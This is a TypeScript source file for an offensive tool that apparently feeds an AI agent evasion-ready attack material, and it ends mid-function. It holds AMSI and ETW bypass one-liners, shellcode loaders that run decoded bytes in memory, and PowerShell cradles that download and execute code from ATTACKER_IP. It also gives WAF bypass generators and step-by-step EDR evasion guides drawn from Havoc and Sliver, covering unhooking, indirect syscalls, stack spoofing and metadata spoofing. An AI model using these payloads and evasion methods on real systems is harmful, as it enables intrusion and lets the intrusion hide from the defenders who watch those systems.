/**
 * TechniqueGeneratorTool — evasion-aware payload generation for authorized assessments
 *
 * Generates bypass-ready payload variants by combining:
 * 1. Havoc-derived operational patterns (order of operations, not just snippets)
 * 2. Evasion compiler strategies (how to construct payloads that avoid detection)
 * 3. Technique-specific generators (AMSI, ETW, WAF, shellcode, PowerShell)
 *
 * Key insight from Havoc C2: evasion happens at MULTIPLE stages:
 * - Compile time: eliminate PE fingerprints (evader flags, config-as-defines)
 * - Load time: hash-based API resolution, no IAT imports
 * - Runtime: indirect syscalls, hardware breakpoints, ROP sleep, stack spoofing
 *
 * Since LLM generates text (not binaries), we guide the agent on HOW to
 * construct techniques, not just WHAT to run.
 */

import type { Tool, ToolContext, ToolDefinition, ToolResult } from '../core/types.js'

// ── AMSI bypass templates (from Havoc Win32.c analysis) ─────────────────────

const AMSI_BYPASS_TEMPLATES: Record<string, string> = {
  reflection_patch: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`,
  string_obfuscation: `$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiU'+[char]116+'ils')
$f=$a.GetField(('am'+[char]115+'iInitFailed'),'NonPublic,Static')
$f.SetValue($null,$true)`,
  env_var: `$env:COMPLUS_ETWEnabled=0
[Environment]::SetEnvironmentVariable('COMPLUS_ETWEnabled', 0, 'Process')`,
  ngen_assembly: `# Use .NET NGEN to bypass AMSI scanning
# AMSI does not scan NGEN-compiled native images
$n = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GetName().Name -eq 'System.Management.Automation' }
# Then execute payload`,
}

// ── ETW bypass templates ───────────────────────────────────────────────────

const ETW_BYPASS_TEMPLATES: Record<string, string> = {
  reflection_patch: `# ETW EventWrite patch via reflection
$etwAssembly = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
if ($etwAssembly) {
  $instance = $etwAssembly.GetField('etwProvider','NonPublic,Static').GetValue($null)
  $instance.GetType().GetField('m_enabled','NonPublic,Instance').SetValue($instance,$false)
}`,
  registry: `# Registry-based ETW disable (requires admin)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application" /v Start /t REG_DWORD /d 0 /f 2>$null`,
}

// ── Havoc-derived evasion compiler strategies ──────────────────────────────

/**
 * These are the actual compiler flags and strategies Havoc uses to eliminate
 * binary fingerprints. The LLM agent can reference these when constructing
 * custom payloads or understanding WHY certain approaches work.
 */
function havocEvasionCompilerFlags(): string {
  return `## Havoc Evasion Compiler Strategy (from Builder.go analysis)

Havoc cross-compiles payload C source at runtime using MinGW with these flags:

\`\`\`
x86_64-w64-mingw32-gcc \\
  -Os \\                           # Optimize for size — smaller binary = less to scan
  -fno-asynchronous-unwind-tables \\  # Remove .eh_frame — eliminates stack walking
  -fno-ident \\                   # Remove compiler identification strings
  -falign-functions=1 \\          # No function alignment — breaks signature matching
  -fpack-struct=8 \\              # Pack structs to 8-byte alignment
  --no-seh \\                     # Disable SEH — prevents SEH-based analysis
  --gc-sections \\                # Remove dead code sections
  -s \\                           # Strip all symbols
  -nostdlib \\                    # No standard library linking — zero libc imports
\`\`\`

### Why these flags matter:
1. **-Os + -s + --gc-sections**: Binary size < 10KB. EDR heuristics often skip tiny files.
2. **-fno-asynchronous-unwind-tables**: Removes stack unwind info. EDR can't walk your stack.
3. **-fno-ident**: No "GCC: (GNU) X.X.X" string in binary — avoids compiler fingerprinting.
4. **-falign-functions=1**: Functions not aligned to 16/32-byte boundaries. Breaks YARA signatures that expect standard alignment.
5. **-nostdlib**: Zero imports from msvcrt.dll. No printf/malloc/strlen in IAT.
6. **--no-seh**: No structured exception handler table. EDR can't use SEH for analysis.

### How to apply this knowledge:
- When writing C payloads: compile with similar flags
- When explaining techniques to LLM: mention these principles
- For PowerShell: equivalent is minimizing string footprint and avoiding known patterns
- For Python: use PyInstaller with --noconsole --upx-dir for similar size reduction`
}

// ── Havoc indirect syscall strategy ────────────────────────────────────────

function indirectSyscallStrategy(): string {
  return `## Havoc Indirect Syscall Strategy (from Syscalls.c / Syscalls.x64.asm)

### The Problem:
EDRs hook ntdll.dll functions (NtWriteVirtualMemory, NtCreateThreadEx, etc.)
by overwriting the first few bytes with a JMP to their monitoring code.
Every call to these APIs goes through the EDR first.

### Havoc's Solution:
1. Parse ntdll.dll in memory to find the SYSCALL instruction bytes
2. Extract the SSN (System Service Number) from eax register setup
3. Build a stub that jumps directly to the syscall instruction (skipping hooks)
4. Execute syscall directly from user space → kernel, bypassing EDR hooks

### SSN Extraction Algorithm (from Syscall.x64.asm):
\`\`\`
; Scan ntdll for the target function
; Read the first bytes — if it starts with "mov r10, rcx; mov eax, SSN"
; then the SSN is in the eax field (offset 4, 4 bytes)
; If the function starts with "jmp", it's been hooked — skip to next
; Continue until finding an unhooked syscall stub
\`\`\`

### How to apply:
- For C payloads: implement indirect syscall using the same SSN extraction
- For PowerShell: use [Ref].Assembly to call unmanaged syscalls directly
- The key principle: EDR hooks user-mode, but syscalls go to kernel directly
- This works because EDR can't hook the kernel side of system calls`
}

// ── Havoc hardware breakpoint AMSI/ETW bypass ──────────────────────────────

function hardwareBypassStrategy(): string {
  return `## Havoc Hardware Breakpoint Bypass Strategy (from HwBpEngine.c)

### The Problem:
Traditional AMSI bypass patches memory (sets amsiInitFailed = true).
EDRs hook NtProtectVirtualMemory to detect memory permission changes.
Memory patching = detectable.

### Havoc's Solution: Hardware Breakpoints (Dr0-Dr3)
Instead of patching memory, set hardware breakpoints on AMSI/ETW functions.
When the CPU hits the breakpoint, a VEH (Vector Exception Handler) intercepts
and redirects execution flow — no memory modification at all.

### Steps:
1. Set Dr0 = address of AmsiScanBuffer entry point
2. Register VEH handler via AddVectoredExceptionHandler()
3. When AmsiScanBuffer is called, DR0 triggers → VEH fires
4. VEH handler modifies RSP to skip the scan → returns "clean"
5. No memory bytes changed — EDR sees nothing

### Why this works:
- Hardware breakpoints are CPU registers, not memory
- VEH is a legitimate Windows API
- No VirtualProtect calls needed
- No memory hooks to detect

### How to apply:
- For C payloads: use HwBpEngine pattern — SetThreadContext for Dr0-Dr3
- For PowerShell: harder — PowerShell doesn't expose debug registers directly
- For assessment guidance: explain the principle so agent understands WHY
  memory patching is detectable and what the alternative is`
}

// ── Havoc sleep obfuscation ────────────────────────────────────────────────

function sleepObfuscationStrategy(): string {
  return `## Havoc Sleep Obfuscation Strategy (from Obf.c — Ekko/Zilean/Foliage)

### The Problem:
EDR hooks NtDelayExecution (Sleep API). When malware sleeps, EDR sees:
- Thread called Sleep()
- Thread wakes up and continues malicious behavior
- EDR can dump memory during sleep to find encrypted sections

### Havoc's Solution: ROP-based Sleep with Image Encryption
1. Encrypt the entire payload image in memory with RC4 (random key each time)
2. Set up a ROP chain that will decrypt after sleep completes
3. Call NtDelayExecution via the ROP chain (not direct call)
4. During sleep: memory is encrypted — EDR dump finds nothing
5. After sleep: ROP chain decrypts and continues

### Variants:
- **Ekko**: Uses NtWaitForSingleObject + ROP chain
- **Zilean**: Uses NtCreateTimer + NtSetTimer + NtWaitForSingleObject
- **Foliage**: Uses callback-based approach with RtlCreateTimer

### How to apply:
- For C payloads: implement Ekko pattern with RC4 + ROP
- For assessment: explain that EDR can monitor sleep patterns
- For PowerShell: use Start-Sleep but ensure payload is encoded/encrypted first`
}

// ── Havoc stack spoofing ───────────────────────────────────────────────────

function stackSpoofingStrategy(): string {
  return `## Havoc Stack Spoofing Strategy (from Spoof.c / Spoof.x64.asm)

### The Problem:
When EDR inspects a thread's stack, it sees:
- Return addresses pointing to your payload (not legitimate DLLs)
- Call chain showing malicious origin
- This is how EDR distinguishes legitimate software from malware

### Havoc's Solution: Return Address Spoofing
1. Find a gadget in a legitimate DLL (kernel32, ntdll) — a "call" instruction
2. Use that gadget's address as the return address on the stack
3. When the syscall completes, it returns to the gadget (legitimate DLL)
4. Gadget jumps back to your code
5. EDR stack walk shows: your_code → kernel32 → ntdll → kernel (looks legitimate)

### Implementation:
- Scan loaded DLLs for "call" instructions that return to caller
- Copy NT_TIB (Thread Information Block) to spoof thread context
- Use Spoof.x64.asm to set up the fake stack frame before syscall

### How to apply:
- For C payloads: use the Spoof.c pattern — find gadgets, build fake stack
- For assessment: explain that EDR stack walking is a primary detection method
- Key insight: the return address on the stack determines what EDR thinks called the API`
}

// ── Havoc hash-based API resolution ────────────────────────────────────────

function hashApiResolution(): string {
  return `## Havoc Hash-Based API Resolution (from Demon agent)

### The Problem:
Importing APIs by name (LoadLibrary, VirtualAlloc) puts strings in the binary.
Static analysis tools (YARA, ClamAV) scan for these strings.

### Havoc's Solution: DJB2 Hash + PEB Walking
1. Every API name is hashed with DJB2 algorithm at compile time
   - "LoadLibraryA" → 0x8F5C7A3E (example hash)
   - "VirtualAlloc" → 0x1A2B3C4D
2. At runtime: parse PEB (Process Environment Block) to find loaded modules
3. For each module, walk its export table
4. Hash each export name, compare with target hash
5. When hash matches → found the function address

### Why this works:
- Zero API name strings in binary
- No IAT (Import Address Table) entries
- Dynamic resolution at runtime — nothing to static analyze
- DJB2 is fast and has good collision resistance for this use case

### How to apply:
- For C payloads: pre-hash API names, implement PEB walking at runtime
- For PowerShell: less relevant (interpreted language), but explains WHY
  string-based detection works and how to avoid it
- Key insight: if you must reference API names, obfuscate the strings`
}

// ── WAF evasion techniques ─────────────────────────────────────────────────

function wafEvasion(payload: string, wafType?: string): string {
  const lines: string[] = ['[TechniqueGenerator] WAF Evasion Payloads', '═'.repeat(50), '']

  if (wafType?.includes('宝塔') || wafType?.toLowerCase().includes('bt')) {
    lines.push('## Baota (BT Panel) WAF Bypass')
    lines.push(`Original payload: ${payload}`)
    lines.push('')
    lines.push('### Method 1: Unicode Encoding')
    lines.push(`  Encode keywords: admin → %u0061%u0064%u006d%u0069%u006e`)
    lines.push('')
    lines.push('### Method 2: SQL Comment Insertion')
    lines.push(`  Insert comments in keywords: OR/**/1=1 → SELECT/**/*/**/FROM`)
    lines.push('')
    lines.push('### Method 3: Chunked Transfer Encoding')
    lines.push(`  POST /target HTTP/1.1
  Host: TARGET
  Transfer-Encoding: chunked

  5
  ${payload.slice(0, 5)}
  ${payload.length - 5}
  ${payload.slice(5)}`)
    lines.push('')
    lines.push('### Method 4: HTTP Parameter Pollution')
    lines.push(`  Same parameter multiple times: ?id=1&id=2&id=${encodeURIComponent(payload)}`)
  } else if (wafType?.toLowerCase().includes('cloudflare')) {
    lines.push('## Cloudflare WAF Bypass')
    lines.push(`Original payload: ${payload}`)
    lines.push('')
    lines.push('### Method 1: Legitimate User-Agent + Referer')
    lines.push(`  curl -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -H "Referer: https://www.google.com" "TARGET"`)
    lines.push('')
    lines.push('### Method 2: JSON Body Encoding (if target accepts JSON)')
    lines.push(`  POST /api HTTP/1.1
  Content-Type: application/json
  {"data": "${Buffer.from(payload).toString('base64')}"}`)
    lines.push('')
    lines.push('### Method 3: Base64 Payload with Server-Side Decode')
    lines.push(`  curl -X POST "TARGET" -d "cmd=${Buffer.from(payload).toString('base64')}"`)
  } else {
    lines.push(`## Generic WAF Bypass (target: ${wafType || 'unknown'})`)
    lines.push(`Original payload: ${payload}`)
    lines.push('')
    lines.push('### Method 1: Case Transformation')
    lines.push(`  ${payload.replace(/[a-zA-Z]/g, (c) => c === c.toUpperCase() ? c.toLowerCase() : c.toUpperCase())}`)
    lines.push('')
    lines.push('### Method 2: Double URL Encoding')
    lines.push(`  ${encodeURIComponent(encodeURIComponent(payload))}`)
    lines.push('')
    lines.push('### Method 3: Chunked Transfer Encoding')
    const encoded = Buffer.from(payload).toString('hex').match(/.{1,16}/g)?.join('\n  ') ?? payload
    lines.push(`  Transfer-Encoding: chunked
  ${encoded}`)
    lines.push('')
    lines.push('### Method 4: SQL Comment Insertion (SQLi context)')
    lines.push(`  SELECT/**/*/**/FROM/**/users — replace SELECT * FROM users`)
    lines.push('')
    lines.push('### Method 5: HTTP Parameter Pollution')
    lines.push(`  ?id=1&id=2&id=${encodeURIComponent(payload)} — backend takes last value`)
  }

  return lines.join('\n')
}

// ── Shellcode encoding (Havoc-derived: XOR + segmented base64) ─────────────

function shellcodeEncode(shellcodeHex: string, encoding: string): string {
  const lines: string[] = ['[TechniqueGenerator] Shellcode Encoding', '═'.repeat(50), '']

  if (encoding === 'xor' || encoding === 'hex' || encoding === 'base64') {
    const xorKey = '0xAB'

    if (encoding === 'xor') {
      lines.push(`## XOR Encoding (key: ${xorKey})`)
      lines.push(`Original shellcode (hex): ${shellcodeHex.slice(0, 80)}...`)
      lines.push('')
      lines.push('### PowerShell XOR Decoder Stub:')
      lines.push(`  $encoded = @()
  # XOR encoded bytes (each byte XOR ${xorKey})
  $encoded = 0x00,0x01,0x02,0x03  # ← replace with actual XOR-encoded shellcode
  $decoded = @()
  for ($i = 0; $i -lt $encoded.Length; $i++) {
    $decoded += ($encoded[$i] -bxor ${xorKey})
  }
  $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($decoded.Length)
  for ($i = 0; $i -lt $decoded.Length; $i++) {
    [System.Runtime.InteropServices.Marshal]::WriteByte($ptr, $i, $decoded[$i])
  }
  $thread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [Func[int]])
  $thread.Invoke()`)
      lines.push('')
      lines.push('### Havoc Principle: XOR encoding prevents static YARA signature')
      lines.push('matching on known shellcode patterns. The decoder stub is small and')
      lines.push('generic, making it harder to fingerprint than raw shellcode.')
    } else if (encoding === 'base64') {
      lines.push(`## Base64 Segmented Encoding`)
      lines.push(`Split shellcode into 3 segments, base64 each separately, concatenate at runtime`)
      lines.push('')
      lines.push('### PowerShell Decoder:')
      lines.push(`  $p1 = "BASE64_PART_1"  # First segment
  $p2 = "BASE64_PART_2"  # Second segment
  $p3 = "BASE64_PART_3"  # Third segment
  $full = [Convert]::FromBase64String($p1 + $p2 + $p3)
  $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($full.Length)
  [System.Runtime.InteropServices.Marshal]::Copy($full, 0, $ptr, $full.Length)
  [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [Func[int]]).Invoke()`)
      lines.push('')
      lines.push('### Havoc Principle: Segmentation prevents any single string from')
      lines.push('matching a known malicious pattern. Each segment individually is benign.')
    } else {
      lines.push(`## Hex Encoding`)
      lines.push(`Original: ${shellcodeHex.slice(0, 80)}...`)
      lines.push(`Encoded: ${shellcodeHex}`)
      lines.push('')
      lines.push('### PowerShell Hex Decoder:')
      lines.push(`  $hex = "${shellcodeHex}"
  $bytes = [byte[]]::new($hex.Length / 2)
  for ($i = 0; $i -lt $hex.Length; $i += 2) {
    $bytes[$i/2] = [Convert]::ToByte($hex.Substring($i, 2), 16)
  }
  # $bytes now contains decoded shellcode`)
    }
  } else {
    lines.push(`## ${encoding} Encoding — Not Supported`)
    lines.push('Supported encodings: xor, base64, hex')
  }

  return lines.join('\n')
}

// ── Obfuscated PowerShell ──────────────────────────────────────────────────

function obfuscatedPS(script: string): string {
  const lines: string[] = ['[TechniqueGenerator] Obfuscated PowerShell', '═'.repeat(50), '']

  // Method 1: Base64 encode + IEX
  const base64 = Buffer.from(script, 'utf16le').toString('base64')
  lines.push('## Method 1: Base64 Encoding + IEX')
  lines.push(`  powershell -nop -w hidden -enc ${base64}`)
  lines.push('')

  // Method 2: String splitting + variable obfuscation
  lines.push('## Method 2: String Splitting + Variable Obfuscation')
  lines.push(`  $a = "IEX"
  $b = "(New-Object Net.WebClient).Downlo"
  $c = "adString('http://ATTACKER_IP/payload.ps1')"
  & $a ($b + $c)`)
  lines.push('')

  // Method 3: Char array reconstruction
  lines.push('## Method 3: Char Array Reconstruction (bypasses static string detection)')
  lines.push(`  $cmd = -join ([char]73 + [char]69 + [char]88 + [char]32 + [char]39 + "payload")
  iex $cmd`)
  lines.push('')

  // Method 4: Download + execute (no -enc flag)
  lines.push('## Method 4: Download + Execute (no -enc flag)')
  lines.push(`  powershell -nop -c "$s=New-Object Net.WebClient;$s.Headers.Add('User-Agent','Mozilla/5.0');iex $s.DownloadString('http://ATTACKER_IP/p')"`)
  lines.push('')

  // Havoc principle
  lines.push('### Havoc Principle: PowerShell obfuscation mirrors Havoc\'s string')
  lines.push('scrambling (ScrambleStr in builder.go) — out-of-order character arrays')
  lines.push('reconstructed at runtime. Static pattern matching fails because the actual')
  lines.push('malicious string never appears as a contiguous sequence in the source.')

  return lines.join('\n')
}

// ── Operational pattern: Havoc execution order ─────────────────────────────

function havocOperationalPattern(): string {
  return `## Havoc Operational Pattern (from Demon.c analysis)

Havoc's Demon agent follows this EXACT order for each operation. This is the
key insight: **sequence matters more than individual techniques**.

### Havoc's Execution Order:
1. **Connect to C2** → AES-256-CTR encrypted channel
2. **Enumerate environment** → OS, architecture, privileges, username, domain
3. **Check AMSI status** → if active, bypass BEFORE any PowerShell
4. **Check ETW status** → if active, bypass BEFORE executing commands
5. **Enumerate credentials** → only after AMTI/ETW bypassed (otherwise logged)
6. **Execute payload** → in-memory, no disk writes if possible
7. **Clean up** → remove artifacts, restore state if needed

### Why this order matters:
- If you execute PowerShell BEFORE AMSI bypass → AMSI logs everything
- If you enumerate creds BEFORE ETW bypass → Event Tracing records it
- If you write to disk BEFORE in-memory check → EDR scans the file
- The HAVOC order is: bypass first, then act

### How to apply:
- Always run EnvAnalyzer FIRST
- Based on results, execute bypasses in order: AMSI → ETW → payload
- Never skip bypass steps even if you think they're unnecessary
- The agent should follow this sequence for EVERY operation`
}

// ── Sliver-derived: RefreshPE (DLL unhooking from disk) ────────────────────

function refreshPE(): string {
  return `## Sliver RefreshPE — DLL Unhooking from Disk (from evasion/evasion_windows.go)

### The Problem:
EDRs inject hooks into ntdll.dll and kernel32.dll at load time. When you call
NtCreateFile or NtQuerySystemInformation, the EDR intercepts and logs it.
Havoc's indirect syscalls bypass this by jumping past hooks to the raw syscall.
Sliver takes a different approach: **replace the hooked bytes entirely**.

### Sliver's Solution: Reload DLL .text from Disk
\`\`\`go
func RefreshPE(name string) error {
    f, e := pe.Open(name)       // Open DLL from disk (e.g., "ntdll.dll")
    x := f.Section(".text")      // Extract the .text section
    dd, e := x.Data()            // Read clean bytes from disk
    return writeGoodBytes(dd, name, x.VirtualAddress, x.Name, x.VirtualSize)
}

func writeGoodBytes(data []byte, name string, rva uint32, sectionName string, vsize uint32) error {
    dll, _ := windows.LoadDLL(name)       // Load DLL into memory
    addr := uintptr(dll.Handle) + uintptr(rva)  // Calculate .text base in memory
    var oldProtect uint32
    windows.VirtualProtect(addr, uintptr(vsize), PAGE_EXECUTE_READWRITE, &oldProtect)
    copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:vsize], data)  // Overwrite with clean bytes
    windows.VirtualProtect(addr, uintptr(vsize), oldProtect, &oldProtect)
    return nil
}
\`\`\`

### How It Works:
1. Open the DLL file from disk (C:\\Windows\\System32\\ntdll.dll)
2. Parse the PE header to find the .text section's file offset and size
3. Read the .text section's raw bytes from disk (these are clean — no EDR hooks)
4. Get the in-memory base address of the loaded DLL
5. Calculate where .text lives in memory (base + RVA)
6. VirtualProtect to RWX, copy clean bytes over, restore permissions
7. All EDR hooks in ntdll/kernel32 are now gone

### Why This Works:
- EDR hooks are in-memory modifications, not on-disk changes
- The DLL file on disk is always clean (unsigned Windows binaries)
- Overwriting .text erases ALL hooks at once — no need to find individual hook locations
- After RefreshPE, you can call NtCreateFile normally — no EDR interception

### Difference from Havoc's Approach:
| Havoc (Indirect Syscalls) | Sliver (RefreshPE) |
|--------------------------|-------------------|
| Extract SSN from ntdll | Replace ntdll .text from disk |
| Jump past hooks directly | Erase hooks entirely |
| Works even if DLL reloaded | Must re-apply after DLL reload |
| More complex implementation | Simpler — just memcopy |
| Leaves hooks in place | Destroys all hooks at once |

### When to Use:
- Use RefreshPE as the FIRST step on a Windows target with EDR
- After RefreshPE, all Win32/NT API calls go unmonitored
- Then apply AMSI/ETW bypasses (which rely on ntdll being clean)
- If EDR re-hooks (some EDRs periodically re-scan), re-run RefreshPE

### Operational Guidance:
\`\`\`
# Step 1: Use Sliver's approach — reload DLL from disk
# Step 2: Verify hooks are gone (call a hooked API, check it doesn't log)
# Step 3: Now AMSI/ETW patching works without EDR catching VirtualProtect
# Step 4: Execute your payload
\`\`\``
}

// ── Sliver-derived: SGN (Shikata-Ga-Nai) encoding ─────────────────────────

function sgnEncoding(): string {
  return `## Sliver SGN Encoder — Shikata-Ga-Nai (from server/encoders/shellcode/sgn/)

### The Problem:
XOR encoding is simple but has a fixed key — if EDR knows the key, it can
decode and scan. Base64 is trivially decoded. Static signatures still match
if the decoder stub itself is known.

### Sliver's Solution: SGN (Go port of Metasploit's classic encoder)
SGN uses an **Additive Feedback with Linear (ADFL) cipher** — each byte
affects the encoding of the next byte, making it a stream cipher, not
simple XOR.

### How SGN Works:
1. **Random seed generation**: Each encoding uses a different random seed
2. **ADFL cipher**: byte[i] encoded = (byte[i] + key) XOR prev_encoded_byte
   - This means: the same shellcode encodes differently each time (polymorphic)
   - Each byte's encoding depends on the previous encoded byte (feedback chain)
3. **Decoder stub**: A small polymorphic decoder is prepended to the payload
   - The decoder knows the seed and reverses the ADFL process
   - The decoder itself is also polymorphic (register allocation varies)
4. **Bad character avoidance**: SGN retries encoding (up to 64 attempts) to
   avoid specified bad characters (null bytes, spaces, newlines, etc.)
5. **ASCII-printable mode**: Can produce entirely printable ASCII output
   — useful for string-based injection (cookie values, HTTP headers, etc.)

### Key Features:
- **Polymorphic**: Same shellcode → different output every time
- **Multi-iteration**: Can encode 1-64 times (each iteration adds another layer)
- **Architecture support**: x86 and x64 decoder stubs
- **Register-safe mode**: Can preserve specific CPU registers
- **Up to 64 retries**: If encoding produces bad characters, retry with different seed

### How to apply:
- For shellcode: use SGN encoding instead of simple XOR
- For HTTP injection: use ASCII-printable SGN mode to embed in headers
- The polymorphic nature defeats static YARA signatures on both payload AND decoder
- Multi-iteration encoding adds layers — even if one layer is broken, the rest remain

### Comparison to Simple XOR:
| Simple XOR | SGN |
|-----------|-----|
| Fixed key (e.g., 0xAB) | Random seed each time |
| Same input → same output | Same input → different output |
| Decoder is static | Decoder is polymorphic |
| No bad-char handling | Retries to avoid bad chars |
| Easily detected by EDR | Much harder to signature |`
}

// ── Sliver-derived: Traffic Encoder Polymorphism ──────────────────────────

function trafficEncoderPattern(): string {
  return `## Sliver Traffic Encoder Polymorphism (from transports/httpclient/ and encoders/)

### The Problem:
C2 HTTP traffic with consistent patterns is detectable by network IDS/IPS.
Fixed URL paths, fixed headers, fixed body encoding = network signatures.

### Sliver's Solution: Polymorphic HTTP Traffic
Sliver encodes C2 traffic using multiple interchangeable encoders, making
each HTTP request look different from the previous one.

### Supported Encoders:
| Encoder | Output Format | Use Case |
|---------|--------------|----------|
| Base64 | Standard Base64 | General purpose |
| Base58 | Bitcoin-style | No special characters |
| Base32 | RFC 4648 | DNS-compatible |
| Hex | Hexadecimal | Raw binary transport |
| English | English words | Looks like natural text |
| PNG | PNG image | Steganographic transport |
| Gzip | Compressed | Size reduction |
| WASM | Custom WebAssembly | User-defined encoding |

### URL Randomization:
1. **Path segments**: Random paths built from configured segments
   - Instead of: POST /beacon → POST /api/v1/users/login
   - Each request uses a different path combination
2. **Nonce query parameter**: Random characters inserted into numeric values
   - ?id=12345 → ?id=12a3b45
   - Prevents replay detection and pattern matching
3. **OTP query arguments**: One-time-pad-like random parameters
   - ?token=abc123&session=def456 (different each request)
4. **User-Agent rotation**: OS-specific Chrome UA generated per-build
   - Each implant has a unique, consistent User-Agent

### Header Polymorphism:
- Configurable headers with probability-based inclusion
- Some headers appear 80% of the time, others 20%
- Makes fingerprinting the C2 profile harder

### How to apply for assessments:
- When sending payloads over HTTP, don't use raw curl
- Encode payload body with a non-standard encoding (Base58, English words)
- Randomize URL paths and query parameters
- Use legitimate-looking User-Agent headers
- The principle: **no two requests should look the same**`
}

// ── Sliver-derived: PE Donor Metadata Spoofing ────────────────────────────

function peDonorSpoofing(): string {
  return `## Sliver PE Donor Metadata Spoofing (from server/generate/spoof.go)

### The Problem:
Compiled binaries have unique metadata: Rich Header, timestamps, version info.
EDR/AV engines fingerprint these to identify malicious compilers.
A Go-compiled binary with default metadata is instantly flagged.

### Sliver's Solution: Clone Metadata from Legitimate Binaries
Sliver's SpoofMetadata() copies PE characteristics from a "donor" binary:

1. **Rich Header Cloning**: The Rich Header is a MSVC linker artifact that
   identifies the compiler version and build environment. Sliver replaces
   the malicious binary's Rich Header with one from a legitimate binary
   (e.g., notepad.exe, svchost.exe).

2. **Timestamp Cloning**: All PE timestamps (COFF header, debug directory,
   export directory) are set to match the donor binary. This prevents
   timestamp-based anomaly detection.

3. **Digital Signature Table Copying ("Luring")**: Copies the signature
   table from a legitimate signed binary. The signature won't verify
   (it points to a different binary), but many scanners just check
   "does it have a signature table?" — the presence of one can reduce
   suspicion even if the signature itself is invalid.

4. **Resource Section Injection**: Copies resource sections (icons, manifests,
   version info) from donor binary with RVA fixups.

5. **PE Checksum Recalculation**: Recalculates the PE checksum to match
   the modified binary — mismatched checksums are a red flag.

### How to apply:
- When compiling custom tools for assessments, clone metadata from a
  legitimate binary on the target system
- Use the donor's Rich Header, timestamps, and resource section
- The principle: **blend in with legitimate software, don't stand out**
- This is post-build modification — the compiled binary is patched AFTER
  compilation, requiring no changes to source code`
}

// ── Sliver-derived: Dual-Mode .NET Execution ──────────────────────────────

function dualModeDotNet(): string {
  return `## Sliver Dual-Mode .NET Execution (from taskrunner/task_windows.go + dotnet_windows.go)

### The Problem:
Running .NET assemblies in-process is detectable (CLR loading is monitored).
Running out-of-process spawns a child process (process creation is monitored).
Both have trade-offs between stealth and OPSEC.

### Sliver's Solution: Two Execution Modes

#### Mode 1: In-Process CLR Hosting (--in-process)
\`\`\`go
func InProcExecuteAssembly(assemblyData []byte, args []string, amsiBypass bool, etwBypass bool) {
    if amsiBypass { patchAmsi() }     // 0xC3 on AmsiScanBuffer/Initialize/ScanString
    if etwBypass { patchEtw() }       // 0xC3 on EtwEventWrite

    clr := CLR.GetInstance()           // Mutex-protected singleton
    runtime := clr.LoadCLR("v4")       // Load CLR v4 (ICLRMetaHost)
    domain := runtime.CreateAppDomain() // Create custom AppDomain
    asm := runtime.LoadAssembly(domain, assemblyData) // Load from byte[]
    runtime.InvokeAssembly(asm, args)  // Call entry point
}
\`\`\`

- Loads CLR into the current process via go-clr library
- Uses ICLRMetaHost → ICORRuntimeHost → AppDomain → Load_3
- Assembly loaded from memory (byte array), not from disk
- AMSI/ETW bypasses applied BEFORE CLR loads
- Assemblies cached by SHA256 hash (avoid re-loading same assembly)

#### Mode 2: Fork-and-Run (default)
\`\`\`go
func ExecuteAssembly(assembly []byte, args []string, processName string, ppid uint32) {
    // 1. Spawn sacrificial process (notepad.exe by default)
    cmd = startProcess(processName, true, true, false, ppid)  // PPID spoof
    // 2. Convert assembly to shellcode via Donut
    shellcode = donut.Convert(assembly)
    // 3. Inject via VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
    // 4. Wait for completion, capture output
    // 5. Kill the host process
}
\`\`\`

- Spawns a sacrificial process (notepad.exe, calc.exe, etc.)
- Converts .NET assembly to shellcode using Donut
- Injects shellcode into the sacrificial process
- Captures stdout/stderr, then kills the process
- PPID spoofing supported (make it look like it spawned from explorer.exe)

### When to Use Each Mode:
| In-Process | Fork-and-Run |
|-----------|-------------|
| Stealthier (no new process) | Safer (if it crashes, implant survives) |
| AMSI/ETW bypass required | Donut conversion adds overhead |
| Assembly runs in implant's context | Assembly runs in isolated process |
| CLR loading detectable by EDR | Process creation detectable by EDR |
| Best for: post-bypass, trusted target | Best for: one-shot tasks, untrusted target |

### Operational Guidance:
1. **Before in-process**: ALWAYS patch AMSI and ETW first
2. **For fork-and-run**: Use PPID spoofing with a legitimate parent (explorer.exe)
3. **Assembly caching**: SHA256 dedup prevents re-loading same assembly
4. **Donut options**: Use aPLib compression + entropy encoding for smaller shellcode`
}

// ── Sliver-derived: Go Template Conditional Compilation ───────────────────

function goTemplateCompilation(): string {
  return `## Sliver Go Template Conditional Compilation (from implant/sliver/*.go.tmpl)

### The Principle:
Sliver uses Go's text/template system to render implant source code at build
time. Every .go file contains conditional directives like:
\`\`\`go
// {{if .Config.IsBeacon}}
import "sync"
// {{end}}
\`\`\`

This means:
- **Dead code elimination**: Only selected C2 channels are compiled in
- **No unused imports**: Template conditionals control import statements
- **Minimal binary**: Only the features you need are in the binary
- **Each build is unique**: Different configs produce different binaries

### How Sliver Builds:
1. Server receives GenerateReq with ImplantConfig
2. renderSliverGoCode() walks implant.FS (embedded source templates)
3. Go template engine renders each .go.tmpl file with config data
4. Canaries, C2 URLs, crypto keys baked in as string literals
5. go.mod/go.sum written, vendor directory copied
6. Import paths renamed to look like unrelated packages
7. Compiled with: go build -trimpath -mod=vendor OR garble -seed=random -literals -tiny

### Key Template Variables:
- .Config.IsBeacon / .Config.IsSession — Connection mode
- .Config.IncludeMTLS / IncludeHTTP / IncludeWG / IncludeDNS — C2 channels
- .Config.Evasion — Enable RefreshPE unhooking
- .Config.ObfuscateSymbols — Enable garble obfuscation
- .Config.LimitHostname / LimitUsername / LimitDatetime — Kill switches
- .Config.C2 — List of C2 server URLs (rendered into closures)
- .Build.PeerPublicKey / AgeServerPublicKey — Crypto material

### How to apply for assessments:
- When building custom tools, use conditional compilation to minimize binary
- Only include the features you need — less code = smaller attack surface
- Use garble for symbol obfuscation: -seed=random -literals -tiny
- The principle: **compile only what you need, obfuscate what remains**`
}

// ── Sliver-derived: Operation Patterns ────────────────────────────────────

function sliverOperationalPattern(): string {
